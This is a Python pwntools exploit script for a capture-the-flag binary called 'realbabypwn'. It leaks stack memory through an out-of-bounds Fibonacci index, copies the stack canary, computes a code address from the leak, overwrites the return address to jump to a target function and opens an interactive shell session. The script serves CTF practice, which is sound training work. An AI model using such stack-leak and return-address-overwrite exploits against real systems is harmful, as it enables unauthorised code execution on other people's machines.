#!/usr/bin/python
from pwn import *


stack = dict()
def main():
    p = remote("ctf.pwn.sg", 1500)
    # p = process('realbabypwn')
    
    # Look up offsets of the stack
    for i in range(255, 255 + 40):
        p.recvuntil("Which fibbonacci offset did you want to look up?")
        p.sendline(str(i))

        p.recvuntil('Fibbonaci Number ')    
        learnt = p.recvuntil("\n")
        value = int(learnt.split(': ')[1])
        offset = i * 8 - 2320
        print('>> offset {} ({}): {}'.format(offset, i, hex(value)))
        stack[offset] = value

        p.recvuntil("Want to learn another Fibbonaci number? (y/n) ")
        p.sendline('y')

    # end off
    p.recvuntil("Which fibbonacci offset did you want to look up?")
    p.sendline('1')
    p.recvuntil("Want to learn another Fibbonaci number? (y/n) ")
    p.sendline('n')

    # now let's craft the payload
    p.recvuntil('Did you learn anything?')
    '''
    >> offset -8 (289): 0x9cfc27816c7eb200
    >> offset 0 (290): 0x7ffde420dad0
    >> offset 8 (291): 0x55662a5e0b92
    >> offset 16 (292): 0x55662a5e0ba0
    >> offset 24 (293): 0x7fc310710b97
    >> offset 32 (294): 0x0
    '''

    # copy canary
    payload = ''
    for key in range(-272, 0 + 8, 8):
        payload += p64(stack[key])

    # calculate addr
    main_addr = stack[16]
    baby_addr = main_addr - 0xba0 + 0x9b0
    payload += p64(baby_addr) # override addr at offset +8
    payload += p64(baby_addr) # override addr at offset +16 also (idk why)

    # add back those after the return address
    # so our read() null byte won't touch it
    # payload += p64(stack[16])
    payload += p64(stack[24])

    # send payload!
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
